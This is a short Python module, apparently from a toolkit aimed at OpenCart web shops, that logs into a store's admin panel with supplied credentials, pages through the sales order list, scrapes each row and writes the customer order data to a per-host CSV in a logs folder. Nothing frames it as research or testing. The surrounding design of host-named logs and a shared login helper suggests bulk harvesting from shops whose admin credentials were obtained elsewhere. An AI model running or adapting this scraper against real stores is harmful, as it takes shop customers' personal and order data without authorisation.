# -*- coding: utf-8 -*-
import os
import re
import time

from core import config, http, ui
from modules import admin

TOKEN = re.compile(r"user_token=([0-9a-zA-Z]+)")
ROW = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S)
CELL = re.compile(r"<td[^>]*>(.*?)</td>", re.S)


def _clean(text):
    text = re.sub(r"<[^>]+>", " ", text)
    return " ".join(text.split())


def run(host, creds, pages=10):
    tok = admin._login(host, creds, "opencart")
    if not tok:
        return ""
    sess = http.persist(host)
    rows = []
    for page in range(1, pages + 1):
        url = ("/admin/index.php?route=sale/order&user_token=%s&page=%d" % (tok, page))
        try:
            r = http.get(host, url, sess=sess, timeout=25)
        except Exception:
            break
        if r.status_code != 200:
            break
        table = r.text
        got = 0
        for tr in ROW.findall(table):
            cells = [_clean(c) for c in CELL.findall(tr)]
            if len(cells) < 5:
                continue
            rows.append(cells)
            got += 1
        if not got:
            break
        time.sleep(0.7)
    if not rows:
        return ""
    path = os.path.join(config.LOGS, host + "_orders.csv")
    with open(path, "w", encoding="utf-8", newline="") as f:
        for cells in rows:
            f.write(";".join(cells[:10]) + "\n")
    ui.ok("заказов: %d" % len(rows))
    return "%s:%d" % (path, len(rows))